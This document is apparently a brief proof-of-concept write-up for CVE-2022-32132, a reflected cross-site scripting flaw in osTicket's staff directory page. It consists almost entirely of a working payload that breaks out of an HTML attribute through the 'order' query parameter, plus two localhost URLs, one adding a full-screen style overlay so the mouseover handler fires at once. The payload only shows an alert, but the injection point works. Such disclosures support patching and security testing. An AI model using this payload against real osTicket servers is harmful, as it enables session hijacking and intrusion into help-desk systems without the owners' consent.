# CVE-2022-32132 for osTicket | Support Ticketing System

Reflected XSS:
```
Payload: " onmouseover="alert(1)

> http://localhost/scp/directory.php?&&order=DESCE%22%20onmouseover=%22alert(1)%22%20style=%22position:fixed;top:0px;right:0;bottom:0px;left:0px;&sort=name
> http://localhost/scp/directory.php?&&order=DESCE%22%20onmouseover=%22alert(1)&sort=name
```
